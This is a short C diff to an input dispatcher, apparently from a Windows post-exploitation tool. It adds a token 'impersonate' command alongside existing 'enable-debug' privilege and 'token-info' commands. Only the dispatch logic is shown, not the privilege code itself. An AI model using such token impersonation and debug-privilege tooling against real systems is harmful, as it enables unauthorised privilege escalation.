@@ -61,9 +61,11 @@ char *handleInput(char *input){
     } else if (strstr(input, "enable-debug") != NULL) {
         result = EnableDebugPrivilege();
     } else if (strstr(input, "impersonate") != NULL) {
-        result = "To Be Continuted... \r\n";
-    } else if (strstr(input, "token-info") != NULL){
         char *command = strtok(input, " "); //first_part points to "impersonate"
+        int token = atoi(strtok(NULL, " "));   //sec_part points to "token"
+        result = impersonate(token);
+    } else if (strstr(input, "token-info") != NULL){
+        char *command = strtok(input, " "); //first_part points to "token-info"
         int token = atoi(strtok(NULL, " "));   //sec_part points to "token"
         result = PrintUserInfoFromToken(token);
     } else {
